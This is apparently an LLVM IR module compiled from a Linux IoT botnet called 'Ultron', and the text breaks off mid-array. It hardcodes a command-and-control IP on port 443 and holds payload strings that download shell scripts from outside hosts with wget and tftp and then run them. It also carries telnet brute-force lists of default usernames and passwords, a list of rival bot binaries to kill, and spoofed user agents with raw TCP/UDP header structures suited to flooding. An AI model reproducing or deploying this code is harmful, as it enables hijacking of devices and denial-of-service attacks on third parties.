; ModuleID = 'host/ir_bcf/Ultron.a.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@UserAgents = global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.36, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.2 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.3 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.4 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.5 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.6 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.7 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.8 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.9 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.10 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.11 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.12 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.13 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.14 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.15 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.16 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.17 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.18 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.19 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.20 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.21 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.22 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.23 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.24 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.25 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.26 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.27 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.28 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.29 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.30 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.31 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.32 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.34 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.35 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.36 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.37, i32 0, i32 0)], align 8
@.str.37 = private unnamed_addr constant [15 x i8] c"168.235.82.217\00", align 1
@port = global i32 443, align 4
@wgetpayload = global i8* getelementptr inbounds ([221 x i8], [221 x i8]* @.str.38, i32 0, i32 0), align 8
@.str.38 = private unnamed_addr constant [221 x i8] c"cd /var/;wget http://168.235.82.217/sh.sh;chmod 777 sh.sh;sh sh.sh;rm -rf sh.sh;tftp -g 168.235.82.217 -r ab.sh;chmod 777 ab.sh;sh ab.sh;rm -rf ab.sh;tftp 168.235.82.217 -c get ac.sh;chmod 777 ac.sh;sh ac.sh;rm -rf ac.sh\00", align 1
@tftppayload = global i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.39, i32 0, i32 0), align 8
@.str.39 = private unnamed_addr constant [111 x i8] c"cd /tmp; /bin/busybox tftp -g -l aiSHxd -r ab.sh 213.183.53.177; /bin/busybox chmod 777 aiSHxd; sh /tmp/aiSHxd\00", align 1
@lynxpayload = global i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.40, i32 0, i32 0), align 8
@.str.40 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@Telnet_Usernames = global [19 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)], align 16
@.str.41 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.42 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.43 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.44 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.46 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.47 = private unnamed_addr constant [10 x i8] c"support\00\00\00", align 1
@.str.48 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.49 = private unnamed_addr constant [7 x i8] c"CISCO\00\00", align 1
@.str.50 = private unnamed_addr constant [8 x i8] c"oracle\00\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"tim\00\00", align 1
@Telnet_Passwords = global [19 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0)], align 16
@.str.52 = private unnamed_addr constant [6 x i8] c"toor\00\00", align 1
@.str.53 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.54 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.56 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.57 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.58 = private unnamed_addr constant [9 x i8] c"netgear1\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.61 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"\00CISCO\00\00", align 1
@Bot_Killer_Binarys = global [176 x i8*] [i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.188, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.189, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.190, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.191, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.192, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.193, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.194, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.195, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.196, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.197, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.198, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.199, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.200, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.201, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.202, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.203, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x 